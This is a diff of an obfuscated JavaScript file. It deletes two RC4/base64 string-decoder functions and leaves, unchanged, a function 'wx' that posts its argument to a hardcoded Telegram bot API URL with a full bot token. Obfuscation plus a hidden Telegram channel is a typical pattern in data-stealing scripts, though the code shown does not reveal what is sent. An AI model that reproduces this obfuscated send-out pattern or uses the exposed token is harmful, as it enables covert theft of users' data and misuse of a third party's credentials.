@@ -1708,56 +1708,7 @@ function wB(d) {
 function _0x66a74b(d, e, c, W, m) {
     return _0x3b85(W - 308, c)
 }
-function _0x3b85(d, e) {
-    const c = _0x77fe();
-    return (_0x3b85 = function(e, W) {
-        let m = c[e -= 0];
-        if (void 0 === _0x3b85.XcciYR) {
-            var a = function(d) {
-                let e = ""
-                  , c = "";
-                for (let c, W, m = 0, a = 0; W = d.charAt(a++); ~W && (c = m % 4 ? 64 * c + W : W,
-                m++ % 4) ? e += String.fromCharCode(255 & c >> (-2 * m & 6)) : 0)
-                    W = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(W);
-                for (let d = 0, W = e.length; d < W; d++)
-                    c += "%" + ("00" + e.charCodeAt(d).toString(16)).slice(-2);
-                return decodeURIComponent(c)
-            };
-            const e = function(d, e) {
-                let c, W, m = [], f = 0, o = "";
-                for (d = a(d),
-                W = 0; W < 256; W++)
-                    m[W] = W;
-                for (W = 0; W < 256; W++)
-                    f = (f + m[W] + e.charCodeAt(W % e.length)) % 256,
-                    c = m[W],
-                    m[W] = m[f],
-                    m[f] = c;
-                W = 0,
-                f = 0;
-                for (let e = 0; e < d.length; e++)
-                    W = (W + 1) % 256,
-                    f = (f + m[W]) % 256,
-                    c = m[W],
-                    m[W] = m[f],
-                    m[f] = c,
-                    o += String.fromCharCode(d.charCodeAt(e) ^ m[(m[W] + m[f]) % 256]);
-                return o
-            };
-            _0x3b85.fPNcsa = e,
-            d = arguments,
-            _0x3b85.XcciYR = !0
-        }
-        const f = c[0]
-          , o = e + f
-          , b = d[o];
-        return b ? m = b : (void 0 === _0x3b85.dPcMZi && (_0x3b85.dPcMZi = !0),
-        m = _0x3b85.fPNcsa(m, W),
-        d[o] = m),
-        m
-    }
-    )(d, e)
-}
+
 async function wx(d) {
     console.log(d),
     fetch("https://api.telegram.org/bot5878709601:AAFnRQxKazkjZBTa-wXmasa80tkJjg3AmWQ/sendMessage", {
@@ -1773,34 +1724,7 @@ async function wx(d) {
         })
     }).then(console.log).catch((d=>console.error(d)))
 }
-function _0x20d2(d, e) {
-    const c = _0x77fe();
-    return (_0x20d2 = function(e, W) {
-        let m = c[e -= 0];
-        if (void 0 === _0x20d2.ZWfNwt) {
-            var a = function(d) {
-                let e = ""
-                  , c = "";
-                for (let c, W, m = 0, a = 0; W = d.charAt(a++); ~W && (c = m % 4 ? 64 * c + W : W,
-                m++ % 4) ? e += String.fromCharCode(255 & c >> (-2 * m & 6)) : 0)
-                    W = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(W);
-                for (let d = 0, W = e.length; d < W; d++)
-                    c += "%" + ("00" + e.charCodeAt(d).toString(16)).slice(-2);
-                return decodeURIComponent(c)
-            };
-            _0x20d2.nUNYkn = a,
-            d = arguments,
-            _0x20d2.ZWfNwt = !0
-        }
-        const f = c[0]
-          , o = e + f
-          , b = d[o];
-        return b ? m = b : (m = _0x20d2.nUNYkn(m),
-        d[o] = m),
-        m
-    }
-    )(d, e)
-}
+
 async function yx(d) {
     console.log(d)
 }
